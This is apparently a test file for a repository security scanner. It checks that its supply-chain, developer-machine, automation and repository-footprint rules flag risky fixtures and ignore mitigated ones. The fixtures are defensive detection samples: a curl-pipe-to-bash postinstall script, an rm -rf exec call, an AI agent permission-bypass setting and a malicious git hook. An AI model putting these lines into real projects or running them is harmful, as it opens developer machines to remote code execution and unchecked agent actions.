// B7-018 — supply-chain, developer-machine, automation, and
// repository-footprint security packs.

import assert from 'node:assert/strict';
import test from 'node:test';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { runSecurityPack } from '../../src/providers/security/candidate-engine.mjs';
import { entity } from '../../src/providers/security/model-extractors/common.mjs';
import supplyChainPack from '../../src/providers/security/packs/supply-chain.mjs';
import developerMachinePack from '../../src/providers/security/packs/developer-machine.mjs';
import automationPack from '../../src/providers/security/packs/automation.mjs';
import footprintPack from '../../src/providers/security/packs/repository-footprint.mjs';

const MODULE_PATHS = {
  'supply-chain': fileURLToPath(new URL('../../src/providers/security/packs/supply-chain.mjs', import.meta.url)),
  'developer-machine': fileURLToPath(new URL('../../src/providers/security/packs/developer-machine.mjs', import.meta.url)),
  automation: fileURLToPath(new URL('../../src/providers/security/packs/automation.mjs', import.meta.url)),
  'repository-footprint': fileURLToPath(new URL('../../src/providers/security/packs/repository-footprint.mjs', import.meta.url)),
};

const registryPath = fileURLToPath(new URL('../../src/registry/rules/security/supply-developer-machine.json', import.meta.url));
const registry = JSON.parse(readFileSync(registryPath, 'utf8'));

const BINDING = {
  planDigest: 'sha256:plan', repositoryRevision: 'rev', dirtyPatchDigest: null,
  blueprintGenerationId: 'gen', blueprintManifestDigest: 'sha256:manifest', registryDigest: 'sha256:registry',
};

function planFor(pack, files) {
  return {
    seal: { digest: BINDING.planDigest },
    binding: {
      repositoryRevision: BINDING.repositoryRevision, dirtyPatchDigest: null,
      blueprint: { generationId: BINDING.blueprintGenerationId, manifestDigest: BINDING.blueprintManifestDigest },
      registryDigest: BINDING.registryDigest,
    },
    providers: [{
      id: pack.id,
      benchmark: { requiredForCleanClaim: true },
      denominator: { pathDigest: 'sha256:denom', pathCount: files.length, paths: files },
    }],
  };
}

function modelFor(files) {
  const entities = [];
  const evidence = [];
  for (const file of files) {
    const evidenceRef = `ev:${file}`;
    entities.push(entity('repository-artifact', file, { path: file }, [evidenceRef]));
    evidence.push({ id: evidenceRef, kind: 'source-location', file, description: 'Repository artifact' });
  }
  return {
    schemaVersion: 1, kind: 'security-surface-model',
    binding: BINDING, denominatorDigest: 'sha256:denom', complete: true,
    entities, relations: [], initialFacts: [], evidence,
    coverage: {}, coverageGaps: [],
  };
}

function run(pack, sourceByFile, { auditFacts = {} } = {}) {
  const files = Object.keys(sourceByFile);
  const plan = planFor(pack, files);
  const model = modelFor(files);
  const projection = { files, sourceText: sourceByFile, auditFacts };
  return runSecurityPack({ pack, root: '/repo', plan, projection, model, providerPlan: plan.providers[0] });
}

const PACKS = [supplyChainPack, developerMachinePack, automationPack, footprintPack];

// ---------------------------------------------------------------------------
// Forbidden imports: no pack may execute repository-local tooling itself.
// ---------------------------------------------------------------------------

test('no B7-018 pack module imports a live-execution/filesystem/network-capable node builtin', () => {
  const forbidden = ['node:child_process', 'node:fs', 'node:http', 'node:https', 'node:net'];
  for (const [name, path] of Object.entries(MODULE_PATHS)) {
    const source = readFileSync(path, 'utf8');
    for (const spec of forbidden) {
      assert.ok(
        !source.includes(`'${spec}'`) && !source.includes(`"${spec}"`),
        `${name} must not import ${spec}`,
      );
    }
  }
});

// ---------------------------------------------------------------------------
// Registry <-> pack rule-id parity (both directions), across all four packs.
// ---------------------------------------------------------------------------

test('registry rule ids and the four packs\' rule ids are in exact two-way parity', () => {
  assert.equal(registry.schemaVersion, 1);
  assert.ok(Array.isArray(registry.rules) && registry.rules.length > 0);

  const registryIds = new Set(registry.rules.map((r) => r.id));
  const packIds = new Set(PACKS.flatMap((pack) => pack.rules.map((r) => r.id)));

  for (const id of packIds) assert.ok(registryIds.has(id), `registry is missing pack rule ${id}`);
  for (const id of registryIds) assert.ok(packIds.has(id), `registry has an orphan rule ${id} not exported by any of the four packs`);
  assert.equal(registryIds.size, packIds.size);

  const validPackIds = new Set(PACKS.map((p) => p.id));
  for (const rule of registry.rules) {
    assert.equal(typeof rule.version, 'string');
    assert.ok(validPackIds.has(rule.pack), `unknown pack ${rule.pack}`);
    assert.equal(typeof rule.class, 'string');
    assert.equal(typeof rule.decisionMode, 'string');
    assert.equal(typeof rule.cleanClaim, 'string');
    assert.ok(Array.isArray(rule.requiredControls));
    assert.equal(typeof rule.requiresSandboxReceipt, 'boolean');
    assert.ok(Array.isArray(rule.applicability) && rule.applicability.length > 0);
  }
});

// ---------------------------------------------------------------------------
// Per-rule positive fixtures across all four packs.
// ---------------------------------------------------------------------------

const supplyChainFixtures = [
  ['supply-chain.dependency.non-registry-source', {
    'package.json': JSON.stringify({ name: 'x', dependencies: { fork: 'git+https://github.com/example/fork.git' } }),
  }],
  ['supply-chain.lockfile.missing', {
    'package.json': JSON.stringify({ name: 'x', version: '1.0.0' }),
  }],
  ['supply-chain.lockfile.integrity-hash-absent', {
    'package-lock.json': JSON.stringify({ lockfileVersion: 3, packages: { foo: { version: '1.0.0' } } }),
  }],
  ['supply-chain.package-script.install-time-execution', {
    'package.json': JSON.stringify({ name: 'x', scripts: { postinstall: 'curl -fsSL https://example.com/setup.sh | bash' } }),
  }],
  ['supply-chain.plugin.unpinned-remote-plugin', {
    '.eslintrc.json': '{"extends": ["https://example.com/eslint-config.js"]}',
  }],
  ['supply-chain.artifact.committed-build-output', {
    'dist/bundle.js': 'console.log(1);',
  }],
  ['supply-chain.cache.poisoning-surface', {
    '.github/workflows/ci.yml': [
      'on:\n  pull_request_target:',
      'jobs:\n  build:\n    steps:',
      '      - uses: actions/cache@v4',
      '        with:\n          path: ~/.npm',
      '          key: npm-${{ github.head_ref }}',
    ].join('\n'),
  }],
];

const developerMachineFixtures = [
  ['developer-machine.local-executable.command-invocation', {
    '.vscode/tasks.json': 'const run = () => child_process.exec("rm -rf /tmp/x");',
  }],
  ['developer-machine.editor-config.command-authority', {
    '.vscode/tasks.json': '{"tasks":[{"task":"build","command":"npm run build"}]}',
  }],
  ['developer-machine.credential-store.access-pattern', {
    'scripts/deploy.mjs': 'const pw = keytar.getPassword("service","user");',
  }],
  ['developer-machine.agent-skill-config.execution-path', {
    '.mcp.json': '{"servers":{"local":{"command":"node","args":["server.js"]}}}',
  }],
  ['developer-machine.sandbox-bypass.permission-override', {
    '.claude/settings.json': '{"permissions": {"bypassPermissions": true}}',
  }],
];

const automationFixtures = [
  ['automation.release.unresolved-identity-scope', {
    '.github/workflows/release.yml': [
      'on:\n  push:\n    tags:\n      - v*',
      'jobs:\n  release:\n    steps:\n      - run: npm publish',
    ].join('\n'),
  }],
  ['automation.updater.insecure-transport-or-unverified-signature', {
    'electron-builder.yml': 'update:\n  url: http://updates.example.com/\n',
  }],
  ['automation.release.signing-disabled-or-unenforced', {
    '.goreleaser.yaml': 'sign: false\n',
  }],
  ['automation.privileged-automation.hostile-trigger-with-write', {
    '.github/workflows/pr-handler.yml': [
      'on:\n  pull_request_target:',
      'permissions:\n  contents: write',
      'jobs:\n  x:\n    steps:\n      - run: echo hi',
    ].join('\n'),
  }],
  ['automation.dependency-update.automerge-without-review', {
    'renovate.json': JSON.stringify({ extends: ['config:base'], automerge: true }),
  }],
];

const footprintFixtures = [
  ['footprint.sourcemap-included', {
    'dist/app.js.map': JSON.stringify({ version: 3, sources: ['app.js'], mappings: 'AAAA' }),
  }],
  ['footprint.local-db-committed', {
    'data/app.sqlite': 'SQLite format 3',
  }],
  ['footprint.internal-endpoint-exposed', {
    'docs/architecture.md': 'Internal admin panel at http://10.0.0.5/admin for debugging.',
  }],
  ['footprint.sensitive-file-committed', {
    '.env': 'API_KEY=xxxx',
  }],
  ['footprint.malicious-repository-boundary', {
    '.git/hooks/pre-commit': '#!/bin/sh\nexec malicious-payload\n',
  }],
];

const ALL_FIXTURES = [
  [supplyChainPack, supplyChainFixtures],
  [developerMachinePack, developerMachineFixtures],
  [automationPack, automationFixtures],
  [footprintPack, footprintFixtures],
];

test('each rule in each of the four packs fires on its representative positive fixture', () => {
  for (const [pack, fixtures] of ALL_FIXTURES) {
    for (const [ruleId, files] of fixtures) {
      const result = run(pack, files);
      assert.equal(result.status, 'candidates', `${ruleId} missed its fixture`);
      assert.deepEqual(result.findings, []);
      const candidate = result.candidates.find((c) => c.ruleId === ruleId);
      assert.ok(candidate, `${ruleId} did not produce a candidate`);
      assert.equal(candidate.verdict, 'UNADJUDICATED');
      assert.equal(candidate.adjudicationRequired, true);
      assert.ok(candidate.evidenceRefs.length > 0, `${ruleId} candidate must carry evidence`);
    }
  }
});

test('every rule id fired by a fixture is declared by its pack and present in the registry', () => {
  const registryIds = new Set(registry.rules.map((r) => r.id));
  for (const [pack, fixtures] of ALL_FIXTURES) {
    const packRuleIds = new Set(pack.rules.map((r) => r.id));
    for (const [ruleId] of fixtures) {
      assert.ok(packRuleIds.has(ruleId), `${ruleId} is not declared by ${pack.id}`);
      assert.ok(registryIds.has(ruleId), `${ruleId} is not declared in the registry`);
    }
  }
});

// ---------------------------------------------------------------------------
// Acceptance: repository content is modeled as hostile evidence in every
// candidate, and tool/config findings name authority and execution path.
// ---------------------------------------------------------------------------

test('every candidate from every pack carries a repository-as-hostile precondition and named authority/execution path', () => {
  for (const [pack, fixtures] of ALL_FIXTURES) {
    for (const [, files] of fixtures) {
      const result = run(pack, files);
      for (const candidate of result.candidates) {
        assert.ok(candidate.preconditions.length > 0, `${candidate.ruleId} must carry a precondition`);
        assert.ok(
          candidate.preconditions.some((p) => p.kind === 'attacker-position' || p.kind === 'knowledge'),
          `${candidate.ruleId} must model repository content as hostile (attacker-position/knowledge precondition)`,
        );
        const hostile = candidate.preconditions.find((p) => p.kind === 'attacker-position' || p.kind === 'knowledge');
        assert.equal(hostile.subject, 'actor:repository-content', `${candidate.ruleId} hostile precondition must name the repository as the untrusted subject`);

        assert.equal(typeof candidate.detectorMetadata.authority, 'string', `${candidate.ruleId} must name an authority`);
        assert.ok(candidate.detectorMetadata.authority.length > 0, `${candidate.ruleId} authority must be non-empty`);
        assert.equal(typeof candidate.detectorMetadata.executionPath, 'string', `${candidate.ruleId} must name an execution path`);
        assert.ok(candidate.detectorMetadata.executionPath.includes('→'), `${candidate.ruleId} execution path must be a hop sequence`);
      }
    }
  }
});

// ---------------------------------------------------------------------------
// Acceptance: privileged automation / developer-machine execution chains
// require a blocked counterpart absent an external sandbox receipt.
// ---------------------------------------------------------------------------

const EXECUTION_CHAIN_RULE_IDS = new Set(
  registry.rules.filter((r) => r.requiresSandboxReceipt === true).map((r) => r.id),
);

test('execution-chain rules are exactly the registry-declared requiresSandboxReceipt set', () => {
  assert.ok(EXECUTION_CHAIN_RULE_IDS.size > 0);
  assert.ok(EXECUTION_CHAIN_RULE_IDS.has('supply-chain.package-script.install-time-execution'));
  assert.ok(EXECUTION_CHAIN_RULE_IDS.has('developer-machine.local-executable.command-invocation'));
  assert.ok(EXECUTION_CHAIN_RULE_IDS.has('developer-machine.agent-skill-config.execution-path'));
  assert.ok(EXECUTION_CHAIN_RULE_IDS.has('automation.privileged-automation.hostile-trigger-with-write'));
  assert.ok(EXECUTION_CHAIN_RULE_IDS.has('footprint.malicious-repository-boundary'));
});

test('absent an external sandbox receipt, no execution-chain candidate carries a clean/proven execution claim', () => {
  for (const [pack, fixtures] of ALL_FIXTURES) {
    for (const [ruleId, files] of fixtures) {
      if (!EXECUTION_CHAIN_RULE_IDS.has(ruleId)) continue;
      // No sandboxReceipt supplied in auditFacts.
      const result = run(pack, files, { auditFacts: {} });
      const candidate = result.candidates.find((c) => c.ruleId === ruleId);
      assert.ok(candidate, `${ruleId} did not produce a candidate`);
      assert.equal(candidate.detectorMetadata.requiresSandboxReceipt, true, `${ruleId} must mark requiresSandboxReceipt`);
      assert.ok(
        candidate.uncertainty.some((u) => /BLOCKED/.test(u) && /sandbox execution receipt/i.test(u)),
        `${ruleId} must carry an explicit blocked/unproven marker in uncertainty`,
      );
      assert.equal(candidate.verdict, 'UNADJUDICATED', `${ruleId} must never carry a clean/proven verdict`);
      assert.notEqual(candidate.verdict, 'TRUE_POSITIVE');
      assert.ok(!('severity' in candidate), `${ruleId} must never carry a final severity`);
      assert.ok(!('evidenceStrength' in candidate), `${ruleId} must never carry a final evidence verdict`);
    }
  }
});

test('a supplied external sandbox receipt still never upgrades a candidate to a clean/proven claim', () => {
  const files = supplyChainFixtures.find(([id]) => id === 'supply-chain.package-script.install-time-execution')[1];
  const result = run(supplyChainPack, files, { auditFacts: { sandboxReceipt: { schemaVersion: 1, kind: 'remediation-sandbox-receipt' } } });
  const candidate = result.candidates.find((c) => c.ruleId === 'supply-chain.package-script.install-time-execution');
  assert.ok(candidate);
  assert.equal(candidate.detectorMetadata.requiresSandboxReceipt, true);
  assert.equal(candidate.verdict, 'UNADJUDICATED');
  assert.ok(candidate.uncertainty.some((u) => /independent adjudication/i.test(u)));
});

// ---------------------------------------------------------------------------
// Acceptance: mitigated fixtures produce no candidates.
// ---------------------------------------------------------------------------

test('a pinned lockfile with integrity hashes and no direct-URL dependency suppresses the supply-chain dependency/lockfile rules', () => {
  const result = run(supplyChainPack, {
    'package.json': JSON.stringify({ name: 'x', version: '1.0.0', dependencies: { 'left-pad': '^1.3.0' } }),
    'package-lock.json': JSON.stringify({ lockfileVersion: 3, packages: { 'left-pad': { version: '1.3.0', integrity: 'sha512-abc' } } }),
  });
  assert.ok(!result.candidates.some((c) => c.ruleId === 'supply-chain.lockfile.missing'));
  assert.ok(!result.candidates.some((c) => c.ruleId === 'supply-chain.lockfile.integrity-hash-absent'));
  assert.ok(!result.candidates.some((c) => c.ruleId === 'supply-chain.dependency.non-registry-source'));
});

test('ignore-scripts configuration suppresses the install-time-execution rule even with a remote-fetch postinstall script', () => {
  const result = run(supplyChainPack, {
    'package.json': JSON.stringify({ name: 'x', scripts: { postinstall: 'curl -fsSL https://example.com/setup.sh | bash' } }),
    '.npmrc': 'ignore-scripts=true\n',
  });
  assert.ok(!result.candidates.some((c) => c.ruleId === 'supply-chain.package-script.install-time-execution'));
});

test('a signed, verified, minimally-scoped release automation config suppresses the automation signing/scope rules', () => {
  const result = run(automationPack, {
    '.github/workflows/release.yml': [
      'on:\n  push:\n    tags:\n      - v*',
      'permissions:\n  contents: write',
      'jobs:\n  release:\n    steps:\n      - run: npm publish\n      - run: cosign sign dist/artifact.tgz',
    ].join('\n'),
    'electron-builder.yml': 'publish:\n  provider: generic\n  url: https://updates.example.com/\nverifyUpdateCodeSignature: true\n',
  });
  assert.ok(!result.candidates.some((c) => c.ruleId === 'automation.release.unresolved-identity-scope'));
  assert.ok(!result.candidates.some((c) => c.ruleId === 'automation.release.signing-disabled-or-unenforced'));
  assert.ok(!result.candidates.some((c) => c.ruleId === 'automation.updater.insecure-transport-or-unverified-signature'));
  assert.ok(!result.candidates.some((c) => c.ruleId === 'automation.privileged-automation.hostile-trigger-with-write'));
});

test('a repository with no committed secrets, db files, source maps, or auto-loaded hooks produces no repository-footprint candidates', () => {
  const result = run(footprintPack, {
    'src/index.mjs': 'export function main() { return 1; }',
    'README.md': 'This project has no sensitive material committed.',
    '.devcontainer/devcontainer.json': '{"image": "node:20"}',
  });
  assert.equal(result.candidates.length, 0);
});

// ---------------------------------------------------------------------------
// Neutral-source regression: no pack should fire on an unrelated benign file.
// ---------------------------------------------------------------------------

test('each of the four packs emits no candidates for a neutral, unrelated source file', () => {
  for (const pack of PACKS) {
    const result = run(pack, { 'src/neutral.mjs': 'export const value = 1;' });
    assert.equal(result.candidates.length, 0, `${pack.id} must stay clean on neutral source`);
  }
});

// ---------------------------------------------------------------------------
// Structural invariants shared by all four packs.
// ---------------------------------------------------------------------------

test('all four packs declare non-empty variantStrategies for every rule and expose the credentials.mjs-style enumerate/rootCause shape', () => {
  for (const pack of PACKS) {
    assert.ok(pack.variantStrategies && typeof pack.variantStrategies === 'object');
    for (const rule of pack.rules) {
      const strategy = pack.variantStrategies[rule.id];
      assert.ok(strategy, `${pack.id} is missing a variantStrategy for ${rule.id}`);
      assert.equal(typeof strategy.rootCause, 'function');
      assert.equal(typeof strategy.enumerate, 'function');
    }
  }
});

test('each pack\'s variantStrategies enumerate alternate configuration/package entrypoints for a multi-entrypoint fixture', () => {
  const files = {
    'package.json': JSON.stringify({ name: 'root', dependencies: { fork: 'git+https://github.com/example/fork.git' } }),
    'apps/api/package.json': JSON.stringify({ name: 'api', dependencies: { fork2: 'git+https://github.com/example/fork2.git' } }),
  };
  const context = {
    root: '/repo',
    plan: planFor(supplyChainPack, Object.keys(files)),
    projection: { files: Object.keys(files), sourceText: files, auditFacts: {} },
    model: modelFor(Object.keys(files)),
    files: Object.keys(files),
    denominatorDigest: 'sha256:denom',
    readFile: (f) => files[f] ?? null,
  };
  const strategy = supplyChainPack.variantStrategies['supply-chain.dependency.non-registry-source'];
  const receipt = strategy.enumerate(context);
  assert.ok(Array.isArray(receipt.matches));
  assert.equal(receipt.matches.length, 2, 'both alternate package-manifest entrypoints must be enumerated');
  assert.ok(receipt.matches.every((m) => m.disposition === 'CONFIRMED'));
  assert.ok(receipt.denominator && receipt.strategies.length > 0);
});
